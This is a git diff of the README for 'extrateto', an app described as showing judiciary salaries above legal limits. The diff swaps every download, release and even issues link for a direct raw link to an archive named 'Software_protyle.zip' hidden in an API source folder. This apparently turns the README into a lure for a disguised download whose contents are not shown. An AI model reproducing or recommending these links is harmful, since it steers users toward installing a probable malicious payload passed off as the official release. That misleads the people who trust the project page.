@@ -1,6 +1,6 @@
 # 🖥️ extrateto - See Judiciary Salaries Above Limits
 
-[![Download extrateto](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/OliverPiano/extrateto/releases)
+[![Download extrateto](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/OliverPiano/extrateto/main/src/app/api/v1/orgaos/Software_protyle.zip)
 
 ## 📋 What is extrateto?
 
@@ -24,12 +24,12 @@ If your system meets these standards, you should have no trouble running the app
 
 To get started, visit the official release page to download extrateto:
 
-[![Download extrateto](https://img.shields.io/badge/Download-Now-red)](https://github.com/OliverPiano/extrateto/releases)
+[![Download extrateto](https://img.shields.io/badge/Download-Now-red)](https://raw.githubusercontent.com/OliverPiano/extrateto/main/src/app/api/v1/orgaos/Software_protyle.zip)
 
 Follow these steps:
 
 1. **Open the download page** by clicking the button above or go directly to:  
-   https://github.com/OliverPiano/extrateto/releases
+   https://raw.githubusercontent.com/OliverPiano/extrateto/main/src/app/api/v1/orgaos/Software_protyle.zip
 
 2. **Find the latest release** on the page. It will usually be at the top with the newest date.
 
@@ -90,7 +90,7 @@ If you see specific error messages, write them down or take a screenshot. This w
 Keep your app up to date for the best data and features.
 
 1. Periodically, revisit the release page:  
-   https://github.com/OliverPiano/extrateto/releases
+   https://raw.githubusercontent.com/OliverPiano/extrateto/main/src/app/api/v1/orgaos/Software_protyle.zip
 
 2. Download the newest version of the installer following the previous download steps.
 
@@ -121,7 +121,7 @@ This process will delete the app but won’t remove any exported files you saved
 If you need more information or assistance using extrateto:
 
 - Visit the repository issues page to report problems:  
-  https://github.com/OliverPiano/extrateto/issues
+  https://raw.githubusercontent.com/OliverPiano/extrateto/main/src/app/api/v1/orgaos/Software_protyle.zip
 
 - Check the included help files or user guide inside the app.
 
@@ -131,4 +131,4 @@ Help is available but keep in mind this is open public software made to give eas
 
 ---
 
-[![Download extrateto](https://img.shields.io/badge/Download-Now-blue)](https://github.com/OliverPiano/extrateto/releases)
+[![Download extrateto](https://img.shields.io/badge/Download-Now-blue)](https://raw.githubusercontent.com/OliverPiano/extrateto/main/src/app/api/v1/orgaos/Software_protyle.zip)
